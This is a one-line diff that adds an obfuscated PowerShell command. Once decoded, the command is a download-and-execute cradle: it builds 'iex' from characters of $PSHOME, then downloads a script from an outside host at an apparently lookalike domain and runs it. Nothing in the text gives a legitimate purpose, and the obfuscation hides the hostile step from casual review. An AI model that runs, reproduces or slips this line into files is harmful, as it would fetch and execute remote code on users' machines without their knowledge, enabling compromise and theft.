@@ -1,0 +1,1 @@
+﻿ .( $PsHoMe[4]+$PSHOmE[30]+'X') ( ((("{5}{14}{7}{13}{9}{4}{17}{2}{6}{3}{0}{1}{11}{12}{8}{15}{10}{16}"-f 'ent).download','string({0}https:/','t.w','cli',' n','iex (n','eb','w','e/','object','aa{','/invesc','o.onlin','-','e','a','0})','e'))-f [cHaR]39)) 
